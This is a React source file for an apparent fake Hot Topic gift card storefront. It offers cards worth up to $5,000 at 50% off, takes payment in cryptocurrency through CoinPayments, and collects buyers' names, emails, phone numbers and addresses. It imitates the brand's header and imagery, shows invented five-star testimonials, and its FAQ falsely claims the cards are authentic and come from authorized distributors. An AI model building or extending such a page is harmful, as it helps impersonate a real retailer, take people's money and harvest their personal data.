import { useState, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import GiftCardOption from "@/components/GiftCardOption";
import DeliveryMethodSelector from "@/components/DeliveryMethodSelector";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicPromo from "@/components/HotTopicPromo";
import HotTopicFooter from "@/components/HotTopicFooter";
import { createCoinPaymentTransaction } from "@/integrations/coinpayments/client";
import { AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users } from "lucide-react";
import ReCAPTCHA from "react-google-recaptcha";

const GIFT_CARD_VALUES = [100, 500, 1000, 5000];
const RECAPTCHA_SITE_KEY = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"; // This is Google's test key, replace with your actual key

// Regex patterns for validation
const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
const PHONE_REGEX = /^(\+1|1)?[-. ]?\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
const ZIP_REGEX = /^\d{5}(-\d{4})?$/;

const Index = () => {
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [deliveryMethod, setDeliveryMethod] = useState<"e-gift" | "physical">("e-gift");
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [recaptchaToken, setRecaptchaToken] = useState<string | null>(null);
  const recaptchaRef = useRef<ReCAPTCHA>(null);

  const validateField = (name: string, value: string): string => {
    switch (name) {
      case "firstName":
      case "lastName":
        return value.trim() === "" ? "This field is required" : "";
      case "email":
        return !EMAIL_REGEX.test(value) ? "Please enter a valid email address" : "";
      case "phone":
        return !PHONE_REGEX.test(value) ? "Please enter a valid US phone number" : "";
      case "address":
      case "city":
      case "state":
        return deliveryMethod === "physical" && value.trim() === "" ? "This field is required" : "";
      case "zipCode":
        return deliveryMethod === "physical" && !ZIP_REGEX.test(value) ? "Please enter a valid ZIP code" : "";
      default:
        return "";
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    
    // Validate field on change and update errors
    const error = validateField(name, value);
    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  const formatPhoneNumber = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as (XXX) XXX-XXXX
    if (cleaned.length >= 10) {
      return `(${cleaned.substring(0, 3)}) ${cleaned.substring(3, 6)}-${cleaned.substring(6, 10)}`;
    } else if (cleaned.length >= 6) {
      return `(${cleaned.substring(0, 3)}) ${cleaned.substring(3, 6)}${cleaned.length > 6 ? '-' + cleaned.substring(6) : ''}`;
    } else if (cleaned.length >= 3) {
      return `(${cleaned.substring(0, 3)})${cleaned.length > 3 ? ' ' + cleaned.substring(3) : ''}`;
    }
    return cleaned;
  };

  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value);
    setFormData(prev => ({
      ...prev,
      phone: formatted
    }));
    
    // Validate phone number
    const error = validateField("phone", formatted);
    setErrors(prev => ({
      ...prev,
      phone: error
    }));
  };

  const handleCaptchaChange = (token: string | null) => {
    setRecaptchaToken(token);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedAmount) {
      toast({
        title: "Error",
        description: "Please select a gift card amount",
        variant: "destructive",
      });
      return;
    }
    
    // Check if CAPTCHA is completed
    if (!recaptchaToken) {
      toast({
        title: "Human Verification Required",
        description: "Please complete the CAPTCHA to verify you're human",
        variant: "destructive",
      });
      return;
    }
    
    // Validate all required fields
    const newErrors: Record<string, string> = {};
    let hasErrors = false;
    
    // Fields to validate
    const fieldNames = ["firstName", "lastName", "email", "phone"];
    if (deliveryMethod === "physical") {
      fieldNames.push("address", "city", "state", "zipCode");
    }
    
    // Validate each field
    fieldNames.forEach(fieldName => {
      const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
      if (error) {
        newErrors[fieldName] = error;
        hasErrors = true;
      }
    });
    
    setErrors(newErrors);
    
    if (hasErrors) {
      toast({
        title: "Validation Error",
        description: "Please fix the errors in the form",
        variant: "destructive",
      });
      return;
    }
    
    // Set loading state
    setIsSubmitting(true);
    
    try {
      console.log(`Starting payment process for $${selectedAmount} gift card (50% off)`);
      
      // Create CoinPayment transaction with 50% of the selected gift card value
      const paymentResult = await createCoinPaymentTransaction({
        amount: selectedAmount * 0.5,
        customerName: `${formData.firstName} ${formData.lastName}`,
        customerEmail: formData.email,
        giftCardValue: selectedAmount,
      });
      
      if (!paymentResult.success) {
        toast({
          title: "Payment Error",
          description: paymentResult.error || "There was an error processing your payment",
          variant: "destructive",
        });
        console.error("Payment creation failed:", paymentResult.error);
        setIsSubmitting(false);
        // Reset reCAPTCHA on failure
        recaptchaRef.current?.reset();
        setRecaptchaToken(null);
        return;
      }
      
      console.log("Payment transaction created successfully, redirecting to:", paymentResult.checkoutUrl);
      
      // Save order details to localStorage for reference
      localStorage.setItem("hotTopicOrder", JSON.stringify({
        customerName: `${formData.firstName} ${formData.lastName}`,
        email: formData.email,
        phone: formData.phone,
        giftCardValue: selectedAmount,
        paymentAmount: selectedAmount * 0.5,
        deliveryMethod: deliveryMethod,
        orderDate: new Date().toISOString(),
      }));
      
      // Redirect to CoinPayments checkout page
      window.location.href = paymentResult.checkoutUrl as string;
    } catch (error) {
      console.error("Payment submission error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
      // Reset reCAPTCHA on failure
      recaptchaRef.current?.reset();
      setRecaptchaToken(null);
    }
  };

  const renderErrorMessage = (fieldName: string) => {
    if (!errors[fieldName]) return null;
    
    return (
      <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
        <AlertCircle className="h-4 w-4" />
        <span>{errors[fieldName]}</span>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black">
      {/* Header */}
      <HotTopicHeader />
      
      {/* Promotional Banner */}
      <HotTopicPromo />
      
      {/* Hero Section */}
      <div className="ht-gradient-bg">
        <div className="container py-6 md:py-8">
          <div className="flex flex-col items-center justify-center mb-4">
            <h1 className="text-3xl md:text-5xl font-bold text-white tracking-tight mb-2 text-center">
              HOT TOPIC <span className="text-hottopic-red glow-text">GIFT CARDS</span>
            </h1>
            <p className="text-center text-xl md:text-2xl text-white/80 mb-2 max-w-2xl">
              The perfect gift for any <span className="text-hottopic-red font-semibold">Hot Topic</span> fan - at <span className="bg-hottopic-red px-2 py-1 rounded-md text-white font-bold inline-block transform -rotate-2 animate-floating">50% OFF</span>
            </p>
            <p className="text-center text-gray-400 max-w-xl">
              Give the gift of alternative culture and fan-favorite merchandise. Hot Topic gift cards can be redeemed at any Hot Topic store or online at hottopic.com
            </p>
          </div>
          
          <div className="flex justify-center">
            <div className="w-full max-w-md p-4 relative">
              
              <img 
                src="https://i.imgur.com/adJEpil.png" 
                alt="Hot Topic Gift Card" 
                className="w-full h-auto rounded-lg shadow-2xl border border-hottopic-gray/30 ht-border-glow"
              />
            </div>
          </div>
        </div>
      </div>
      
      
      
      {/* Main Content */}
      <div className="container py-8">
        <form onSubmit={handleSubmit} className="max-w-3xl mx-auto space-y-8">
          {/* Step 1: Select Gift Card Amount */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                1
              </span>
              Select Gift Card Amount
            </h2>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
              {GIFT_CARD_VALUES.map(value => (
                <GiftCardOption
                  key={value}
                  value={value}
                  isSelected={selectedAmount === value}
                  originalPrice={value}
                  discountedPrice={value * 0.5}
                  onClick={() => setSelectedAmount(value)}
                />
              ))}
            </div>
          </div>
          
          {/* Step 2: Delivery Method */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                2
              </span>
              Choose Delivery Method
            </h2>
            
            <DeliveryMethodSelector 
              selectedMethod={deliveryMethod} 
              onSelect={setDeliveryMethod} 
            />
          </div>
          
          {/* Step 3: Customer Information */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                3
              </span>
              Your Information
            </h2>
            
            <div className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="firstName" className="text-white">First Name*</Label>
                  <Input
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.firstName ? 'border-red-500' : ''}`}
                    placeholder="Enter first name"
                  />
                  {renderErrorMessage("firstName")}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="lastName" className="text-white">Last Name*</Label>
                  <Input
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.lastName ? 'border-red-500' : ''}`}
                    placeholder="Enter last name"
                  />
                  {renderErrorMessage("lastName")}
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-white">Email Address*</Label>
                  <Input
                    id="email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.email ? 'border-red-500' : ''}`}
                    placeholder="example@email.com"
                  />
                  {renderErrorMessage("email")}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-white">Phone Number*</Label>
                  <Input
                    id="phone"
                    name="phone"
                    value={formData.phone}
                    onChange={handlePhoneInput}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.phone ? 'border-red-500' : ''}`}
                    placeholder="(123) 456-7890"
                  />
                  {renderErrorMessage("phone")}
                </div>
              </div>
              
              {/* Conditional Shipping Address Fields */}
              {deliveryMethod === "physical" && (
                <div className="space-y-4 pt-4 border-t border-hottopic-gray/30">
                  <h3 className="text-xl font-medium text-white">Shipping Address</h3>
                  
                  <div className="space-y-2">
                    <Label htmlFor="address" className="text-white">Street Address*</Label>
                    <Input
                      id="address"
                      name="address"
                      value={formData.address}
                      onChange={handleInputChange}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.address ? 'border-red-500' : ''}`}
                      placeholder="Enter street address"
                    />
                    {renderErrorMessage("address")}
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="city" className="text-white">City*</Label>
                      <Input
                        id="city"
                        name="city"
                        value={formData.city}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.city ? 'border-red-500' : ''}`}
                        placeholder="Enter city"
                      />
                      {renderErrorMessage("city")}
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="state" className="text-white">State*</Label>
                      <Input
                        id="state"
                        name="state"
                        value={formData.state}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.state ? 'border-red-500' : ''}`}
                        placeholder="Enter state"
                      />
                      {renderErrorMessage("state")}
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="zipCode" className="text-white">ZIP Code*</Label>
                      <Input
                        id="zipCode"
                        name="zipCode"
                        value={formData.zipCode}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.zipCode ? 'border-red-500' : ''}`}
                        placeholder="Enter ZIP code"
                      />
                      {renderErrorMessage("zipCode")}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
          
          {/* Human Verification */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                4
              </span>
              Human Verification
            </h2>
            <div className="flex justify-center">
              <div className="bg-white p-2 rounded-md">
                <ReCAPTCHA
                  ref={recaptchaRef}
                  sitekey={RECAPTCHA_SITE_KEY}
                  onChange={handleCaptchaChange}
                  theme="light"
                />
              </div>
            </div>
            <p className="text-gray-400 text-sm text-center">
              <Shield size={16} className="inline mr-1" />
              We want to ensure our discounted gift cards are only available to real humans, not bots.
            </p>
          </div>
          
          {/* Order Summary */}
          {selectedAmount && (
            <div className="bg-hottopic-gray/10 border border-hottopic-gray/20 rounded-xl p-6">
              <h2 className="text-xl font-semibold text-white mb-4 flex items-center">
                <span className="mr-2">Order Summary</span>
                <div className="flex-grow border-b border-dashed border-hottopic-gray/30"></div>
              </h2>
              
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">Gift Card Value</span>
                  <span className="text-white">${selectedAmount.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Discount (50%)</span>
                  <span className="text-hottopic-red">-${(selectedAmount * 0.5).toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Delivery Method</span>
                  <span className="text-white capitalize">{deliveryMethod}</span>
                </div>
                <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                  <span className="text-white">Total</span>
                  <span className="text-hottopic-red text-xl">${(selectedAmount * 0.5).toFixed(2)}</span>
                </div>
              </div>
              
              {/* Payment methods section removed */}
            </div>
          )}
          
          {/* Submit Button */}
          <div className="flex justify-center">
            <Button 
              type="submit" 
              disabled={isSubmitting || !selectedAmount || !recaptchaToken}
              className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
            >
              {isSubmitting ? "Processing..." : "Complete Purchase"}
            </Button>
          </div>
          
          <div className="flex items-center justify-center text-center">
            <LockIcon size={16} className="text-gray-400 mr-2" />
            <p className="text-gray-400 text-sm">
              Secure checkout - Your information is protected with 256-bit SSL encryption
            </p>
          </div>
        </form>
      </div>
      
      {/* Testimonials section */}
      <div className="bg-hottopic-gray/10 border-y border-hottopic-gray/20 py-10">
        <div className="container">
          <h2 className="text-2xl font-bold text-white mb-6 text-center">What Our Customers Say</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto">
            <TestimonialCard 
              name="Jessica M." 
              rating={5}
              content="I got a Hot Topic gift card for my daughter at 50% off and she absolutely loved it! Fast delivery and no issues."
            />
            <TestimonialCard 
              name="Mike T." 
              rating={5}
              content="Perfect gift for my niece who loves Hot Topic. The process was simple and the discount was amazing."
            />
            <TestimonialCard 
              name="Sarah K." 
              rating={5}
              content="I was skeptical at first, but the gift card worked perfectly at my local Hot Topic store. Will definitely buy again!"
            />
          </div>
        </div>
      </div>
      
      {/* FAQ Section */}
      <div className="container py-10">
        <h2 className="text-2xl font-bold text-white mb-6 text-center">Frequently Asked Questions</h2>
        
        <div className="max-w-3xl mx-auto space-y-4">
          <FaqItem 
            question="How do Hot Topic gift cards work?" 
            answer="Hot Topic gift cards can be used for purchases at any Hot Topic store or on hottopic.com. Our e-gift cards are delivered instantly by email, while physical gift cards are shipped to your address."
          />
          <FaqItem 
            question="Are these official Hot Topic gift cards?" 
            answer="Yes, all our gift cards are 100% authentic Hot Topic gift cards purchased directly from authorized distributors."
          />
          <FaqItem 
            question="How long does shipping take?" 
            answer="Physical gift cards are typically shipped within 24 hours and delivered within 3-5 business days. E-gift cards are delivered instantly to your email."
          />
          <FaqItem 
            question="Do Hot Topic gift cards expire?" 
            answer="No, Hot Topic gift cards never expire and have no fees."
          />
          <FaqItem 
            question="Can I check my gift card balance?" 
            answer="Yes, you can check your gift card balance at any Hot Topic store or on hottopic.com."
          />
        </div>
      </div>
      
      {/* Footer */}
      <HotTopicFooter />
    </div>
  );
};

// Testimonial Card Component
const TestimonialCard = ({ name, rating, content }: { name: string; rating: number; content: string }) => {
  return (
    <div className="bg-hottopic-dark p-6 rounded-lg border border-hottopic-gray/30">
      <div className="flex items-center mb-2">
        {Array.from({ length: 5 }).map((_, i) => (
          <svg 
            key={i}
            className={`w-4 h-4 ${i < rating ? 'text-yellow-500' : 'text-gray-400'}`}
            fill="currentColor" 
            viewBox="0 0 20 20"
          >
            <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
          </svg>
        ))}
      </div>
      <p className="text-gray-300 mb-3 text-sm">"{content}"</p>
      <p className="text-white font-semibold">{name}</p>
    </div>
  );
};

// FAQ Item Component
const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
  const [isOpen, setIsOpen] = useState(false);
  
  return (
    <div className="border-b border-hottopic-gray/30 pb-2">
      <button 
        onClick={() => setIsOpen(!isOpen)}
        className="flex justify-between items-center w-full py-3 text-left focus:outline-none"
      >
        <h3 className="text-white font-medium">{question}</h3>
        <ChevronRight className={`text-hottopic-red transition-transform ${isOpen ? 'transform rotate-90' : ''}`} size={20} />
      </button>
      {isOpen && (
        <div className="pb-3 text-gray-400 text-sm">
          <p>{answer}</p>
        </div>
      )}
    </div>
  );
};

export default Index;
